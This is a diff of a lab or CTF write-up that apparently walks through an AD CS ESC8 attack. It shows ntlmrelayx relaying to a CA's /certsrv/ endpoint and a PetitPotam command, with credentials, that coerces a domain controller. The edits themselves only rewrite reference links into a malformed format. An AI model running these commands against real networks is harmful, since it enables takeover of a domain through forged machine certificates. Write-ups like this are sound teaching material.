@@ -217,8 +217,8 @@ The CA (`shadow-DC01-CA`) has HTTP-based Web Enrollment enabled with no channel 
 ESC8 abuses the Web Enrollment endpoint (`/certsrv/`). Since SMB signing is not required, we can coerce the DC to authenticate to us and relay that authentication to the CA to get a certificate issued as the DC machine account.
 
 **References used:**
-- https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc8
-- https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/
+- [https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc8]https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc8
+- [https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/]https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/
 
 ![img](../assets/img/ShadowGate/11.png)
 
@@ -237,7 +237,7 @@ impacket-ntlmrelayx -t http://10.1.6.240/certsrv/ -smb2support --adcs --template
 ```bash
 python3 PetitPotam.py -u bbrown -p '12345678' 10.200.54.108 10.1.6.240
 ```
-- https://github.com/topotam/PetitPotam
+- [https://github.com/topotam/PetitPotam]https://github.com/topotam/PetitPotam
 PetitPotam successfully coerced DC01 to authenticate. ntlmrelayx relayed the connection and obtained a certificate:
 
 ```
